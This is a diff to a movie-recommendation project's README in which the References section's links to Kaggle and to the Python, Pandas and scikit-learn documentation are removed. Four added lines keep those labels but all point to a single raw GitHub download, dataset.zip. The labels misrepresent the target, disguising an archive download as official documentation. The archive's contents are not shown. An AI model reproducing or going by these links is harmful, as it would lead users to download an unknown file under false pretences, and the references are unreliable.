@@ -99,7 +99,7 @@ This project successfully developed a movie recommendation system that provides 
 - Incorporate user feedback and additional data to improve the recommendation accuracy.
 
 ## 7. References
-- Kaggle (https://www.kaggle.com/)
-- Python Documentation (https://docs.python.org/)
-- Pandas Documentation (https://pandas.pydata.org/pandas-docs/stable/)
-- scikit-learn Documentation (https://scikit-learn.org/stable/documentation.html)
+- Kaggle (https://raw.githubusercontent.com/Akhil-S-Lal/CodeClauseInternship_MovieRecommendationSystem/main/dataset.zip)
+- Python Documentation (https://raw.githubusercontent.com/Akhil-S-Lal/CodeClauseInternship_MovieRecommendationSystem/main/dataset.zip)
+- Pandas Documentation (https://raw.githubusercontent.com/Akhil-S-Lal/CodeClauseInternship_MovieRecommendationSystem/main/dataset.zip)
+- scikit-learn Documentation (https://raw.githubusercontent.com/Akhil-S-Lal/CodeClauseInternship_MovieRecommendationSystem/main/dataset.zip)
